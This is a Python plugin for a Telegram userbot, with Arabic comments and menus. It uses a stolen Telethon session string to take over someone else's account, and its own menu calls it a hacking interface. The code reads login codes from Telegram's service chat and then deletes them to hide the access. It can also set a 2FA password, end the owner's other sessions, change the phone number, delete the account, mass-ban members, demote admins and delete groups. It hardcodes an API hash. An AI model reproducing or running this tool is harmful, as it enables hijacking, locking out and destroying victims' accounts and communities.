#جميع الحقوق محفوظه لسورس جمثون 
# حقوق كامله للسورس ممنوع الخمـــــــــــــط
import os
import logging
import time
from os import getenv

from telethon import TelegramClient
from userbot import *
from userbot.Config import Config
from userbot.plugins import *
from telethon import events, functions, types

api_id = os.environ.get("APP_ID")
import asyncio
import os
from os import system
from userbot.sql_helper.idadder_sql import add_usersid_in_db, already_added
from telethon.tl.types import ChannelParticipantsAdmins

api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
from telethon import TelegramClient as tg
from telethon import functions
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
from telethon.tl.functions.channels import DeleteChannelRequest as dc
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc
from telethon.tl.functions.channels import JoinChannelRequest as join
from telethon.tl.functions.channels import LeaveChannelRequest as leave
import re
from telethon import *
from telethon import Button, custom, events
from telethon.tl.functions.users import GetFullUserRequest
mybot = "missrose_bot"
from userbot import bot



async def change_number_code(strses, number, code, otp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = X
        try:
            result = await bot(
                functions.account.ChangePhoneRequest(
                    phone_number=number, phone_code_hash=code, phone_code=otp
                )
            )
            return True
        except:
            return False


async def change_number(strses, number):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = X
        result = await bot(
            functions.account.SendChangePhoneCodeRequest(
                phone_number=number,
                settings=types.CodeSettings(
                    allow_flashcall=True, current_number=True, allow_app_hash=True
                ),
            )
        )
        return str(result)


async def userinfo(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return str(k)


async def terminate(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(rt())


GROUP_LIST = []


async def delacc(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(functions.account.DeleteAccountRequest("هممم"))


async def promote(strses, grp, user):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_admin(
                grp,
                user,
                manage_call=True,
                invite_users=True,
                ban_users=True,
                change_info=True,
                edit_messages=True,
                post_messages=True,
                add_admins=True,
                delete_messages=True,
            )
        except:
            await X.edit_admin(
                grp,
                user,
                is_admin=True,
                anonymous=False,
                pin_messages=True,
                title="Owner",
            )


async def user2fa(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_2fa("**-جمثون هو الأفضل**")
            return True
        except:
            return False


async def demall(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
            except:
                await X.edit_admin(
                    grp,
                    x.id,
                    manage_call=False,
                    invite_users=False,
                    ban_users=False,
                    change_info=False,
                    edit_messages=False,
                    post_messages=False,
                    add_admins=False,
                    delete_messages=False,
                )


async def joingroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(join(username))


async def leavegroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(leave(username))


async def delgroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(dc(username))


async def cu(strses):
    try:
        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception:
        return False


async def usermsgs(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        i = ""
        async for x in X.iter_messages(777000, limit=3):
            i += f"\n{x.text}\n"
        await tgbot.delete_dialog(777000)
        return str(i)


async def userbans(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_participants(grp)
        for x in k:
            try:
                await X.edit_permissions(grp, x.id, view_messages=False)
            except:
                pass


async def userchannels(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X(pc())
        i = ""
        for x in k.chats:
            try:
                i += f'\n▾∮ اسم القنـاة {x.title} - معرف القنـاة @{x.username}\n'
            except:
                pass
        return str(i)


import logging

logging.basicConfig(level=logging.WARNING)

channel = "jmthon"

menu = """
**عزيزي المستخدم اولا ارسل الحرف المقابل لكل امر تريده**: 

A : [ ** تحقق من قنوات ومجموعات الحساب **]

B : [** اضهار معلومات الحساب كالرقم والايدي والاسم....الخ**]

C : [** لـحظر جميع اعضاء مجموعة معينة**]

D : [** تسجيل الدخول الى حساب المستخدم **]

E : [** اشتراك بقناة معينة** ]

F : [** مغادرة قناة معينة **]

G : [** حذف قناة او مجموعة **]

H : [** التحقق اذا كان التحقق بخطوتين مفعل ام لا **]

I : [** تسجيل الخروج من جميع الجلسات عدا جلسة البوت **]

J : [** حذف الحساب نهائيا**]

K : [** تنزيل جميع المشرفين من مجموعة معينة او قناة **]

L : [** رفع مشرف لشخص معين في قناة او مجموعة **]

** ارسل الحرف الان
BY ~ @JMTHON

"""
mm = """
**مرحبا بك في واجهة الاختراق عبر كود تيرمكس . ارسل /rz \n فقط مالكي يمكنه استخدام هذه الميزه اذا اردت تجربتها قم بتنصيب سورس جمثون**
"""


@tgbot.on(events.NewMessage(pattern="/rz", func=lambda x: x.sender_id == bot.uid))
async def start(rzjmthon):
    global menu
    async with tgbot.conversation(rzjmthon.chat_id) as x:
        await x.send_message(f"▾∮ قـائمة اوامر البوت :\n{menu}")
        res = await x.get_response()
        r = res.text
        if res.text == "A":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالج يبدو انه قد تم ازالته من حساب الشخص.\n ارسل /rz"
                )
            try:
                i = await userchannels(strses.text)
            except:
                return await rzjmthon.reply(
                    "- هذا الكود غير صالح يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            if len(i) > 3855:
                file = open("session.txt", "w")
                file.write(i + "\n\nالمعلومات بواسطة جمثون:")
                file.close()
                await bot.send_file(rzjmthon.chat_id, "session.txt")
                system("rm -rf session.txt")
            else:
                await rzjmthon.reply(i + "\n\n**- عذرا هذا المستخدم ليس لديه قنوات او كىوبات هو انشئها \n ارسل للاختراق /rz")
        elif res.text == "B":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالج يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            i = await userinfo(strses.text)
            await rzjmthon.reply(i + "\n\n- هذا المستخدم ليس لديه اي معلومات .\n/rz")
        elif r == "C":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond("- حسنا ارسل كود تيرمكس الآن")
            await x.send_message("- الان ارسل معرف او ايدي المجموعه او القناة")
            grpid = await x.get_response()
            await userbans(strses.text, grpid.text)
            await rzjmthon.reply("- يتم حظر المستخدمين شكرا لاستخدامك بوت جمثون")
        elif r == "D":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالح يبدو انه قد تم ازالته من حساب الشخص\n ارسل مره اخرى /rz للأختراق"
                )
            i = await usermsgs(strses.text)
            await rzjmthon.reply(i + "\n\n- عذرا هنالك خطا ما")
        elif r == "E":
            await x.send_message(" - حسنا ارسل كود تيرمكس الآن")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالح يبدو انه قد تم ازالته من حساب الشخص\n ارسل للأختراق مره اخرى /rz"
                )
            await x.send_message("- الان ارسل معرف او ايدي المجموعه او القناة")
            grpid = await x.get_response()
            await joingroup(strses.text, grpid.text)
            await rzjmthon.reply(
                "- تم الانضمام بنجاح  ✓.\n ارسل للأختراق مره اخرى /rz"
            )
        elif r == "F":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالج يبدو انه قد تم ازالته من حساب الشخص\n ارسل للأختراق مره اخرى /rz"
                )
            await x.send_message("- الان ارسل معرف او ايدي المجموعه او القناة")
            grpid = await x.get_response()
            await leavegroup(strses.text, grpid.text)
            await rzjmthon.reply(
                "تمت المغادرة بنجاح  ✓ارسل\n للأختراق مره اخرى ارسل /rz"
            )
        elif r == "G":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالج يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            await x.send_message("- الان ارسل معرف او ايدي المجموعه او القناة")
            grpid = await x.get_response()
            await delgroup(strses.text, grpid.text)
            await rzjmthon.reply(
                "- تمت بنجاح حذف القناه او المجموعه بواسطه جمثون ✓\n/rz"
            )
        elif r == "H":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالح يبدو انه قد تم ازالته من حساب الشخص"
                )
            i = await user2fa(strses.text)
            if i:
                await rzjmthon.reply(
                    "- المستخدم لم يقم بتفعيل التحقق بخطوتين تستطيع اختراقه .\n استخدم /rz للاختراق"
                )
            else:
                await rzjmthon.reply("- هذا المستخدم مفعل تحقق بخطوتين لا يمكنك الدخول لحسابه لكن تستطيع استخدام بقيه الاوامر")
        elif r == "I":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالج يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            i = await terminate(strses.text)
            await rzjmthon.reply(
                "- تم حذف جميع الجلسات بنجاح ✓"
            )
        elif res.text == "J":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالح يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            i = await delacc(strses.text)
            await rzjmthon.reply(
                "- تمت حذف هذا الحساب بنجاح شكرا لاستخدامك سورس جمثون"
            )
        elif res.text == "L":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالج يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            await x.send_message("الان ارسل معرف او ايدي المجموعه او القناة")
            grp = await x.get_response()
            await x.send_message("- الان ارسل معرف المستخدم")
            user = await x.get_response()
            i = await promote(strses.text, grp.text, user.text)
            await rzjmthon.reply(
                "- حسنا لقد قمت برفعك مشرف بنجاح كم انت محظوظ لديك جمثون  :) "
            )
        elif res.text == "K":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "- هذا الكود غير صالح يبدو انه قد تم ازالته من حساب الشخص\n ارسل /rz"
                )
            await x.send_message("الان ارسل معرف او ايدي المجموعه او القناة")
            pro = await x.get_response()
            try:
                i = await demall(strses.text, pro.text)
            except:
                pass
            await rzjmthon.reply(
                "- تم تنزيل جميع المستخدمين بنجاح  :)"
            )
        elif res.text == "M":
            await x.send_message("- حسنا ارسل كود تيرمكس الآن ")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await rzjmthon.respond(
                    "\n/rz"
                )
            await x.send_message(
                "**-**"
            )
            number = (await x.get_response()).text
            try:
                result = await change_number(strses.text, number)
                await rzjmthon.respond(
                    result
                    + "\n **-**"
                )
                await asyncio.sleep(20)
                await x.send_message("- الان ارسل كود الدولة")
                phone_code_hash = (await x.get_response()).text
                await x.send_message("- الان ارسل كود التحقق ")
                otp = (await x.get_response()).text
                changing = await change_number_code(
                    strses.text, number, phone_code_hash, otp
                )
                if changing:
                    await rzjmthon.respond("- تم بنجاح تغيير  رقم االحساب ✓")
                else:
                    await rzjmthon.respond("**-هنالك شي خطأ*")
            except Exception as e:
                await rzjmthon.respond(
                    "هنالك خطأ ارسل هاذ الخطا للمطورين \n**الخطأ**\n" + str(e)
                )

        else:
            await rzjmthon.respond("▾∮ استخدم /rz فقط")

